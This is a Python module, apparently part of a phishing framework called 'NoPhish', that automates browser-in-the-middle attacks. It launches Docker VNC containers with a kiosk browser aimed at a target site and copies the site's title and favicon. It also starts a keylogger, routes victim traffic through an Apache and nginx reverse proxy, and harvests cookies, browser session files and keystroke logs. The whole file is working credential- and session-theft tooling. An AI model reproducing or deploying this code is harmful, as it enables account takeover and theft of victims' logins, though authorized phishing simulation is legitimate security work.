import io
import os
import tarfile
import time
import secrets
import uuid

import docker
import docker.errors


def get_client():
    return docker.from_env()


def create_vnc_container(user_num, is_mobile=False, browser="firefox"):
    """Create a VNC container and return (container_name, password, container).

    Raises RuntimeError if the container fails to start.
    """
    client = get_client()
    pw = secrets.token_hex(14)
    if browser == "chrome":
        prefix = "cmvnc" if is_mobile else "cvnc"
        image = "cmvnc-docker" if is_mobile else "cvnc-docker"
    else:
        prefix = "mvnc" if is_mobile else "vnc"
        image = "mvnc-docker" if is_mobile else "vnc-docker"
    name = f"{prefix}-user{user_num}"

    # Remove existing container if any
    try:
        old = client.containers.get(name)
        old.remove(force=True)
        time.sleep(1)
    except docker.errors.NotFound:
        pass

    # Different env vars for chrome-novnc (Alpine) vs accetto (Ubuntu)
    if browser == "chrome":
        env = {"VNC_PASS": pw, "VNC_RESOLUTION": "375x812" if is_mobile else "1920x1080"}
    else:
        env = {"VNC_PW": pw, "NOVNC_HEARTBEAT": "30"}

    try:
        container = client.containers.run(
            image,
            detach=True,
            tty=True,
            stdin_open=True,
            name=name,
            environment=env,
        )
    except docker.errors.APIError as e:
        raise RuntimeError(f"Docker API error creating {name}: {e}")

    # Wait for container to be running
    for _ in range(30):
        container.reload()
        if container.status == "running":
            break
        time.sleep(1)
    else:
        # Container didn't start - check logs for reason
        try:
            logs = container.logs(tail=20).decode("utf-8", errors="ignore")
        except Exception:
            logs = "unable to retrieve logs"
        try:
            container.remove(force=True)
        except Exception:
            pass
        raise RuntimeError(f"Container {name} failed to start. Logs: {logs}")

    # Connect to panel-net so nginx can reach it by name via Docker DNS
    try:
        panel_net = client.networks.get("panel-net")
        panel_net.connect(container)
    except docker.errors.APIError:
        pass  # Already connected or network missing — non-fatal

    return name, pw, container


def configure_vnc_container(container_name, is_mobile, useragent, page_title, target, domain, ssl, redirect, ico_path=None, browser="firefox"):
    """Apply browser prefs, page title, favicon, keylogger, start browser."""
    client = get_client()
    container = client.containers.get(container_name)

    # Determine noVNC base path based on container type
    if browser == "chrome":
        novnc_base = "/opt/novnc"
        logger_src = "/opt/logger.py"
    else:
        novnc_base = "/usr/libexec/noVNCdim"
        logger_src = None  # will use /app/vnc/logger.py

    if browser == "chrome":
        # Chrome Alpine containers: no Firefox profile, no XFCE
        pass
    else:
        # Firefox: start and kill once to create profile
        container.exec_run("sh -c 'firefox &'")
        time.sleep(1)
        container.exec_run("sh -c 'pidof firefox | xargs kill'")
        time.sleep(1)

        # Build user.js content
        if is_mobile:
            ua = useragent if useragent else "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15"
            prefs = f'user_pref("general.useragent.override","{ua}");\n'
            prefs += 'user_pref("font.name.serif.x-western", "DejaVu Sans");\n'
            prefs += 'user_pref("signon.showAutoCompleteFooter", false);\n'
            prefs += 'user_pref("signon.rememberSignons", false);\n'
            prefs += 'user_pref("signon.formlessCapture.enabled", false);\n'
            prefs += 'user_pref("signon.storeWhenAutocompleteOff", false);\n'
            prefs += 'user_pref("layout.css.devPixelsPerPx", "1.0");\n'
        else:
            ua = useragent if useragent else "This user was phished by NoPhish"
            prefs = f'user_pref("general.useragent.override","{ua}");\n'
            prefs += 'user_pref("font.name.serif.x-western", "DejaVu Sans");\n'
            prefs += 'user_pref("signon.showAutoCompleteFooter", false);\n'
            prefs += 'user_pref("signon.rememberSignons", false);\n'
            prefs += 'user_pref("signon.formlessCapture.enabled", false);\n'
            prefs += 'user_pref("signon.storeWhenAutocompleteOff", false);\n'

        _put_file(container, "/home/headless/user.js", prefs)
        container.exec_run("sh -c \"find -name cookies.sqlite -exec dirname {} \\; -exec sh -c 'cp -f /home/headless/user.js {}' \\;\"")

    # Set page title
    if page_title:
        safe_title = page_title.replace("'", "\\'").replace("/", "\\/")
        container.exec_run(f"sed -i 's/Connecting.../{safe_title}/' {novnc_base}/conn.html", user="root")
        container.exec_run(f"sed -i 's/Connecting.../{safe_title}/' {novnc_base}/app/ui.js", user="root")
        if is_mobile and browser != "chrome":
            container.exec_run(f"sed -i 's/min-width: 8em;/\\/\\*min-width: 8em;\\*\\//' {novnc_base}/app/styles/input.css", user="root")

    # Set favicon
    if ico_path and os.path.exists(ico_path):
        _put_file_from_path(container, f"{novnc_base}/app/images/icons/novnc.ico", ico_path)

    # Set redirect target in ui.js
    if redirect:
        escaped_target = target.replace("/", "\\/")
        container.exec_run(f"sed -i 's/TARGET_URL/{escaped_target}/g' {novnc_base}/app/ui.js", user="root")
    else:
        scheme = "https" if ssl else "http"
        escaped = f"{scheme}://{domain}".replace("/", "\\/")
        container.exec_run(f"sed -i 's/TARGET_URL/{escaped}/g' {novnc_base}/app/ui.js", user="root")

    # Start keylogger
    if browser == "chrome":
        # Keylogger is already baked into the image at /opt/logger.py
        time.sleep(0.5)
        container.exec_run("sh -c 'python3 /opt/logger.py &'", detach=True)
    else:
        logger_path = "/app/vnc/logger.py"
        if os.path.exists(logger_path):
            _put_file_from_path(container, "/home/headless/logger.py", logger_path)
        time.sleep(0.5)
        container.exec_run("sh -c 'python3 /home/headless/logger.py'", detach=True)

    # Start browser in kiosk mode
    if browser == "chrome":
        # Chrome Alpine containers: DISPLAY=:0, binary is 'chromium'
        if is_mobile:
            ua = useragent if useragent else "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
            # Hide cursor on Alpine (xdotool-based, no unclutter)
            hide_cursor_script = (
                "#!/bin/sh\n"
                "sleep 3\n"
                "xdotool mousemove 9999 9999\n"
            )
            _put_file(container, "/tmp/hide_cursor.sh", hide_cursor_script)
            container.exec_run("chmod +x /tmp/hide_cursor.sh", user="root")
            container.exec_run("/tmp/hide_cursor.sh", detach=True)
            window_size = "375,812"
        else:
            ua = useragent if useragent else "This user was phished by NoPhish"
            window_size = "1920,1080"
        # Write a launcher script to avoid shell quoting issues
        launcher = (
            "#!/bin/sh\n"
            "sleep 2\n"
            f'chromium'
            f' --no-sandbox --kiosk --no-first-run --disable-infobars --disable-session-crashed-bubble'
            f' --disable-translate --disable-features=TranslateUI --disable-sync'
            f' --disable-dev-shm-usage --disable-gpu'
            f' --disable-extensions --disable-plugins --disable-popup-blocking'
            f' --disable-pinch --disable-overscroll-gesture'
            f' --force-dark-mode --enable-features=WebRTCPipeCapturers'
            f' --user-agent="{ua}" --window-size={window_size} --window-position=0,0 "{target}"\n'
        )
        _put_file(container, "/tmp/launch_browser.sh", launcher)
        container.exec_run("chmod +x /tmp/launch_browser.sh", user="root")
        container.exec_run("/tmp/launch_browser.sh", detach=True)
    else:
        # Accetto Firefox containers: DISPLAY=:1
        if is_mobile:
            container.exec_run("sh -c 'nohup unclutter -idle 0 > /dev/null 2>&1 &'")
        else:
            container.exec_run("sh -c 'xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &'")
        container.exec_run(f"sh -c 'xrandr --output VNC-0 & env DISPLAY=:1 firefox {target} --kiosk &'")

    return _get_container_ip(container)


def get_container_ip(container_name):
    """Get the IP address of a container."""
    client = get_client()
    try:
        container = client.containers.get(container_name)
        return _get_container_ip(container)
    except docker.errors.NotFound:
        return None


def start_rev_proxy(campaign, users, admin_password, ico_path=None):
    """Start the Apache reverse proxy and configure nginx to route phishing traffic to it.

    Args:
        campaign: Campaign model instance
        users: list of CampaignUser model instances (with vnc_password, vnc_ip, etc.)
        admin_password: password for htpasswd admin access
        ico_path: path to favicon file

    Returns:
        (success: bool, message: str)
    """
    from . import apache_config

    client = get_client()

    # Remove existing rev-proxy
    try:
        old = client.containers.get("rev-proxy")
        old.remove(force=True)
    except docker.errors.NotFound:
        pass

    # Rev-proxy only needs admin port exposed; phishing traffic comes through nginx
    port_bindings = {"65534/tcp": 65534}

    # Start rev-proxy container
    try:
        container = client.containers.run(
            "rev-proxy",
            detach=True,
            tty=True,
            stdin_open=True,
            name="rev-proxy",
            ports=port_bindings,
            command="/bin/bash",
        )
    except Exception as e:
        return False, f"Failed to start rev-proxy container: {e}"

    # Wait for container
    for _ in range(30):
        container.reload()
        if container.status == "running":
            break
        time.sleep(1)
    else:
        return False, "Rev-proxy container failed to reach running state"

    # Connect rev-proxy to panel-net so nginx can reach it
    try:
        panel_net = client.networks.get("panel-net")
        panel_net.connect(container, aliases=["revproxy"])
    except Exception as e:
        return False, f"Failed to connect rev-proxy to panel-net: {e}"

    # Copy SSL certs if needed
    if campaign.ssl and campaign.cert_path and campaign.key_path:
        if os.path.exists(campaign.cert_path):
            _put_file_from_path(container, "/etc/ssl/certs/server.pem", campaign.cert_path)
        if os.path.exists(campaign.key_path):
            _put_file_from_path(container, "/etc/ssl/private/server.key", campaign.key_path)

    # Add Listen 65534 to ports.conf
    container.exec_run("bash -c 'grep -q \"Listen 65534\" /etc/apache2/ports.conf || echo \"Listen 65534\" >> /etc/apache2/ports.conf'")

    # Create htpasswd
    container.exec_run(f"htpasswd -cb /etc/apache2/.htpasswd angler {admin_password}")

    # Generate and deploy Apache config (Apache listens on port 80 inside container)
    config_content = apache_config.generate_config(campaign, users, ssl=False)
    _put_file(container, "/etc/apache2/sites-enabled/000-default.conf", config_content)

    # Generate and deploy iframe HTML files
    # Always use HTTPS for iframe URLs since nginx handles SSL termination
    # (even if campaign.ssl is False, nginx serves HTTPS to the browser)
    for user in users:
        if user.vnc_password and user.vnc_ip:
            iframe_html = apache_config.generate_iframe_html(
                campaign.domain, user.vnc_password,
                campaign.page_title or "Loading...", ssl=True, is_mobile=False
            )
            _put_file(container, f"/var/www/html/iframe{user.user_num}.html", iframe_html)

        if user.mvnc_password and user.mvnc_ip:
            miframe_html = apache_config.generate_iframe_html(
                campaign.domain, user.mvnc_password,
                campaign.page_title or "Loading...", ssl=True, is_mobile=True
            )
            _put_file(container, f"/var/www/html/miframe{user.user_num}.html", miframe_html)

    # Copy favicon
    if ico_path and os.path.exists(ico_path):
        _put_file_from_path(container, "/var/www/html/favicon.ico", ico_path)

    # Tune Apache keepalive
    container.exec_run("sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' /etc/apache2/apache2.conf")

    # Create empty redirects file
    container.exec_run("touch /tmp/redirects.txt")
    container.exec_run("chmod 777 /tmp/redirects.txt")

    # Start Apache and cron
    result = container.exec_run("service apache2 restart")
    if result.exit_code != 0:
        error_msg = result.output.decode("utf-8", errors="ignore")
        return False, f"Apache failed to start: {error_msg}"

    container.exec_run("cron")

    # Now configure nginx to route phishing traffic to rev-proxy
    ok, msg = _update_nginx_phishing_routes(client, campaign, users)
    if not ok:
        return False, f"Rev-proxy started but nginx update failed: {msg}"

    return True, "Rev-proxy started and nginx configured"


def _update_nginx_phishing_routes(client, campaign, users):
    """Generate nginx config for phishing routes and reload nginx."""
    try:
        nginx = client.containers.get("nophish-nginx")
    except docker.errors.NotFound:
        return False, "nophish-nginx container not found"

    # Build upstream config
    upstream_conf = "upstream revproxy { server revproxy:80; }\n"

    # Build phishing route config for nginx
    # Routes: /v{N}/* -> rev-proxy, /{vnc_password}/* -> rev-proxy, /favicon.ico -> rev-proxy
    routes = []

    # Favicon
    routes.append("""
location = /favicon.ico {
    proxy_pass http://revproxy;
    proxy_set_header Host $host;
}""")

    for user in users:
        n = user.user_num
        # Phishing URL path /v{N} -> rev-proxy (Apache rewrites to iframe)
        routes.append(f"""
location /v{n} {{
    proxy_pass http://revproxy;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}}""")

        # VNC password paths for desktop
        if user.vnc_password:
            pw = user.vnc_password
            routes.append(f"""
location /{pw}/websockify {{
    proxy_pass http://revproxy;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_read_timeout 600s;
    proxy_hide_header X-Frame-Options;
}}
location /{pw} {{
    proxy_pass http://revproxy;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 600s;
    proxy_hide_header X-Frame-Options;
}}""")

        # VNC password paths for mobile
        if user.mvnc_password:
            pw = user.mvnc_password
            routes.append(f"""
location /{pw}/websockify {{
    proxy_pass http://revproxy;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_read_timeout 600s;
    proxy_hide_header X-Frame-Options;
}}
location /{pw} {{
    proxy_pass http://revproxy;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 600s;
    proxy_hide_header X-Frame-Options;
}}""")

        # iframe/miframe HTML files served by rev-proxy
        routes.append(f"""
location = /iframe{n}.html {{
    proxy_pass http://revproxy;
    proxy_set_header Host $host;
}}
location = /miframe{n}.html {{
    proxy_pass http://revproxy;
    proxy_set_header Host $host;
}}""")

    phishing_conf = "\n".join(routes) + "\n"

    # Write configs into nginx container
    _put_file(nginx, "/etc/nginx/conf.d/upstream_revproxy.conf", upstream_conf)
    _put_file(nginx, "/etc/nginx/conf.d/phishing_routes.conf", phishing_conf)

    # Reload nginx
    result = nginx.exec_run("nginx -s reload")
    if result.exit_code != 0:
        error_msg = result.output.decode("utf-8", errors="ignore")
        return False, f"nginx reload failed: {error_msg}"

    return True, "nginx updated"


def check_image_exists(image_name):
    """Check if a Docker image exists locally."""
    client = get_client()
    try:
        client.images.get(image_name)
        return True
    except docker.errors.ImageNotFound:
        return False


def check_docker_available():
    """Check if Docker daemon is accessible."""
    try:
        client = get_client()
        client.ping()
        return True, "Docker is available"
    except Exception as e:
        return False, f"Docker not available: {e}"


def get_container_info(container_name):
    """Get container information including IP address."""
    client = get_client()
    try:
        container = client.containers.get(container_name)
        container.reload()
        
        # Get container IP address
        networks = container.attrs.get("NetworkSettings", {}).get("Networks", {})
        ip_address = None
        for network_name, network_info in networks.items():
            if network_info.get("IPAddress"):
                ip_address = network_info["IPAddress"]
                break
        
        return {
            "name": container.name,
            "status": container.status,
            "ip": ip_address
        }
    except docker.errors.NotFound:
        return None
    except Exception as e:
        print(f"Error getting container info for {container_name}: {e}")
        return None


def disconnect_user_to_file(container_name, redirect_target="/"):
    """Write redirect rules to disconnect file in rev-proxy container for a specific container."""
    client = get_client()
    try:
        # Check if rev-proxy container exists
        if not client.containers.list(all=True, filters={"name": "rev-proxy"}):
            return False
            
        container = client.containers.get("rev-proxy")
        disconnect_file = "/tmp/redirects.txt"
        
        # Get container info to find its port mapping
        container_info = client.containers.get(container_name)
        container_info.reload()
        
        # Extract port mapping (this is simplified - actual implementation may need more complex parsing)
        ports = container_info.attrs.get("NetworkSettings", {}).get("Ports", {})
        vnc_port = None
        for port_mapping in ports.get("5901/tcp", []):
            vnc_port = port_mapping.get("HostPort")
            break
        
        if not vnc_port:
            return False
        
        # Create redirect rule
        redirect_rule = f"/v{container_name.split('-')[-1]} http://localhost:{vnc_port}/ {redirect_target}\n"
        
        # Check if disconnect file exists
        if container.exec_run(f"test -f {disconnect_file}")[0] == 0:
            # Read existing content
            result = container.exec_run(f"cat {disconnect_file}")
            existing_content = result[1].decode('utf-8').strip()
            
            # Check if rule already exists
            if redirect_rule.strip() in existing_content:
                return True
            
            # Add new rule
            new_content = existing_content + redirect_rule
            container.exec_run(f'echo "{new_content}" > {disconnect_file}')
        else:
            # Create new file
            container.exec_run(f'echo "{redirect_rule}" > {disconnect_file}')
        
        return True
    except Exception as e:
        print(f"Error disconnecting user: {e}")
        return False


def disconnect_user(ip_address):
    """Write IP to disconnect file in rev-proxy container."""
    client = get_client()
    try:
        # Check if rev-proxy container exists
        if not client.containers.list(all=True, filters={"name": "rev-proxy"}):
            return False
            
        container = client.containers.get("rev-proxy")
        disconnect_file = "/tmp/disconnect.txt"
        
        # Check if disconnect file exists
        import os
        if container.exec_run(f"test -f {disconnect_file}")[0] == 0:
            # Read existing content
            result = container.exec_run(f"cat {disconnect_file}")
            existing_content = result[1].decode('utf-8').strip()
            
            # Check if IP already exists
            if ip_address in existing_content:
                return True
            
            # Add new IP
            new_content = existing_content + f"\n{ip_address}"
            container.exec_run(f'echo "{new_content}" > {disconnect_file}')
        else:
            # Create new file
            container.exec_run(f'echo "{ip_address}" > {disconnect_file}')
        
        return True
    except docker.errors.NotFound:
        return False


def add_redirect_rules(vnc_pw, redirect_target):
    """Add redirect rules to the rev-proxy."""
    client = get_client()
    try:
        container = client.containers.get("rev-proxy")
        container.exec_run(f"bash -c 'echo \"/{vnc_pw}/websockify {redirect_target}\" >> /tmp/redirects.txt'")
        container.exec_run(f"bash -c 'echo \"/{vnc_pw}/conn.html {redirect_target}\" >> /tmp/redirects.txt'")
        return True
    except docker.errors.NotFound:
        return False


def collect_data_from_container(container_name, user_num, output_dir, is_mobile=False, browser="firefox"):
    """Extract cookies, sessions, keylogs from a container."""
    client = get_client()
    prefix = "m" if is_mobile else ""

    try:
        container = client.containers.get(container_name)
    except docker.errors.NotFound:
        return {"cookies": 0, "sessions": 0, "keylog": ""}

    if browser == "chrome":
        # Chromium stores data differently on Alpine vs accetto
        # Try both common paths
        container.exec_run("sh -c 'cp -f /root/.config/chromium/Default/Cookies /tmp/cookies.sqlite 2>/dev/null || cp -f /home/headless/.config/chromium/Default/Cookies /tmp/cookies.sqlite 2>/dev/null'")
        container.exec_run("sh -c 'cp -f /root/.config/chromium/Default/Current\\ Session /tmp/current-session 2>/dev/null || cp -f /home/headless/.config/chromium/Default/Current\\ Session /tmp/current-session 2>/dev/null'")
        container.exec_run("sh -c 'cp -f /root/.config/chromium/Default/Current\\ Tabs /tmp/current-tabs 2>/dev/null || cp -f /home/headless/.config/chromium/Default/Current\\ Tabs /tmp/current-tabs 2>/dev/null'")
    else:
        # Firefox stores data in profile directory
        container.exec_run("sh -c 'find -name recovery.jsonlz4 -exec cp {} /home/headless/ \\;'")
        container.exec_run("sh -c 'find -name cookies.sqlite -exec cp {} /home/headless/ \\;'")

    recovery_path = os.path.join(output_dir, f"{prefix}user{user_num}-recovery.jsonlz4")
    cookies_path = os.path.join(output_dir, f"{prefix}user{user_num}-cookies.sqlite")
    keylog_path = os.path.join(output_dir, f"{prefix}user{user_num}-keylog.txt")

    if browser == "chrome":
        # Chrome session files (from /tmp/ where we copied them above)
        session_path = os.path.join(output_dir, f"{prefix}user{user_num}-current-session")
        tabs_path = os.path.join(output_dir, f"{prefix}user{user_num}-current-tabs")
        _get_file(container, "/tmp/current-session", session_path)
        _get_file(container, "/tmp/current-tabs", tabs_path)
        _get_file(container, "/tmp/cookies.sqlite", cookies_path)
        # Use session_path as recovery_path equivalent
        recovery_path = session_path
    else:
        _get_file(container, "/home/headless/recovery.jsonlz4", recovery_path)
        _get_file(container, "/home/headless/cookies.sqlite", cookies_path)

    # Get keylog - check both possible paths
    keylog_content = ""
    keylog_found = False
    for keylog_check_path in ["/root/Keylog.txt", "/home/headless/Keylog.txt", "/Keylog.txt"]:
        result = container.exec_run(f"test -e {keylog_check_path}")
        if result.exit_code == 0:
            _get_file(container, keylog_check_path, keylog_path)
            keylog_found = True
            break
    if keylog_found and os.path.exists(keylog_path):
        with open(keylog_path, "r", errors="ignore") as f:
            keylog_content = f.read()

    # Cleanup inside container
    if browser == "chrome":
        container.exec_run("sh -c 'rm -f /tmp/cookies.sqlite /tmp/current-session /tmp/current-tabs'")
    else:
        container.exec_run("sh -c 'rm -f /home/headless/recovery.jsonlz4'")
        container.exec_run("sh -c 'rm -f /home/headless/cookies.sqlite'")

    return {
        "recovery_path": recovery_path if os.path.exists(recovery_path) else None,
        "cookies_path": cookies_path if os.path.exists(cookies_path) else None,
        "keylog": keylog_content,
    }


def get_container_status(container_name):
    """Get running status of a container."""
    client = get_client()
    try:
        container = client.containers.get(container_name)
        return container.status
    except docker.errors.NotFound:
        return "not_found"


def remove_campaign_containers(campaign_users):
    """Remove all containers for a campaign."""
    client = get_client()
    for user in campaign_users:
        for name in [user.vnc_container, user.mvnc_container]:
            if name:
                try:
                    c = client.containers.get(name)
                    c.remove(force=True)
                except docker.errors.NotFound as e:
                    pass
    # Remove rev-proxy
    try:
        c = client.containers.get("rev-proxy")
        c.remove(force=True)
    except docker.errors.NotFound:
        pass


def fetch_page_title(target):
    """Fetch the page title from a target URL."""
    import subprocess
    try:
        result = subprocess.run(
            ["curl", target, "-sL", "-A",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"],
            capture_output=True, text=True, timeout=10
        )
        import re
        match = re.search(r"<title[^>]*>(.*?)</title>", result.stdout, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return ""


def fetch_favicon(target, output_path):
    """Download favicon for the target domain."""
    import subprocess
    try:
        subprocess.run(
            ["curl", f"https://www.google.com/s2/favicons?domain={target}",
             "-sL", "--output", output_path],
            timeout=10
        )
        return os.path.exists(output_path)
    except Exception:
        return False


# --- Internal helpers ---

def _get_container_ip(container):
    """Extract IP from container network settings."""
    container.reload()
    networks = container.attrs.get("NetworkSettings", {}).get("Networks", {})
    for net in networks.values():
        ip = net.get("IPAddress")
        if ip:
            return ip
    return None


def _put_file(container, path, content):
    """Write string content to a file inside a container."""
    data = content.encode("utf-8")
    filename = os.path.basename(path)
    dirname = os.path.dirname(path)

    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w") as tar:
        info = tarfile.TarInfo(name=filename)
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    tar_stream.seek(0)
    container.put_archive(dirname, tar_stream)


def _put_file_from_path(container, dest_path, src_path):
    """Copy a local file into a container."""
    with open(src_path, "rb") as f:
        data = f.read()
    filename = os.path.basename(dest_path)
    dirname = os.path.dirname(dest_path)

    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w") as tar:
        info = tarfile.TarInfo(name=filename)
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    tar_stream.seek(0)
    container.put_archive(dirname, tar_stream)


def _get_file(container, src_path, dest_path):
    """Copy a file from a container to local filesystem."""
    try:
        bits, _ = container.get_archive(src_path)
        tar_stream = io.BytesIO()
        for chunk in bits:
            tar_stream.write(chunk)
        tar_stream.seek(0)
        with tarfile.open(fileobj=tar_stream) as tar:
            for member in tar.getmembers():
                f = tar.extractfile(member)
                if f:
                    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                    with open(dest_path, "wb") as out:
                        out.write(f.read())
                    return True
    except Exception:
        pass
    return False
